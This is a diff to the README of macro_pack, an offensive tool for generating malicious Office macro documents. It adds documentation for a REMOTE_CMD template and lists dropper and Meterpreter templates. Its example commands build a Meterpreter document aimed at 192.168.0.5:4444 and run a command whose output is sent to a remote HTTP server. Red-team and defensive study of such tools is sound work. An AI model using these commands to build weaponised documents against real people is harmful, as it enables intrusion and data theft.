@@ -305,7 +305,7 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
         
     -t, --template=TEMPLATE_NAME    Use VBA template already included in macro_pack.exe.
-        Available templates are: HELLO, CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, WEBMETER, EMBED_EXE, EMBED_DLL 
+        Available templates are: HELLO, CMD, REMOTE_CMD, DROPPER, DROPPER2, DROPPER_PS, DROPPER_DLL, METERPRETER, WEBMETER, EMBED_EXE, EMBED_DLL 
         Help for template usage: macro_pack.exe -t help
          
     -G, --generate=OUTPUT_FILE_PATH. Generates a file. Will guess the format based on extension.
@@ -363,8 +363,12 @@ Just print a hello message and awareness about macro
 Give this template the name or email of the author   
   -> Example: ```echo "@Author" | macro_pack.exe -t HELLO -G hello.pptm```
 
-  
 ### CMD
+Execute a command 
+Give this template a command line
+  -> Example (pop calc.exe from and xslt file):  ```echo "calc.exe" | macro_pack.exe -t CMD -G cmd.xsl```
+  
+### REMOTE_CMD
 Execute a command line and send result to remote http server  
 Give this template the server url and the command to run  
   -> Example:  ```echo "http://192.168.0.5:7777" "dir /Q C:" | macro_pack.exe -t CMD -o -G cmd.doc``` 
